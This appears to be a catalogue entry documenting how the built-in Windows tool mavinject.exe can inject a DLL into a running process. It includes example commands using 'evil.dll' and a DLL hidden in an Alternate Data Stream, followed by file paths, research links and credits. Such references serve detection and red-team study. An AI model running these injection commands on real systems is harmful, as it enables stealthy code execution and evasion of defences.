## Mavinject.exe
```

MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll
Inject evil.dll into a process with PID 3110.

Mavinject.exe 4172 /INJECTRUNNING "c:\ads\file.txt:file.dll"
Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: []()   
   
* Links:   
  * https://twitter.com/gN3mes1s/status/941315826107510784
  * https://twitter.com/Hexcorn/status/776122138063409152
  * https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
  * https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e
   
* File path:   
  * C:\Windows\System32\mavinject.exe
  * C:\Windows\SysWOW64\mavinject.exe
   
* Acknowledgement:   
  * Name: Giuseppe
    * Twitter: [@gN3mes1s](https://twitter.com/@gN3mes1s)
    * Blog: https://quequero.org/
  * Name: Adam
    * Twitter: [@hexacorn](https://twitter.com/@hexacorn)
    * Blog: http://www.hexacorn.com/blog/
  * Name: Oddvar Moe
    * Twitter: [@oddvarmoe](https://twitter.com/@oddvarmoe)
    * Blog: http://oddvar.moe
  * Name: Matt Graeber
    * Twitter: [@mattifestation ](https://twitter.com/@mattifestation )
    * Blog: http://www.exploit-monday.com/
   
OS:  
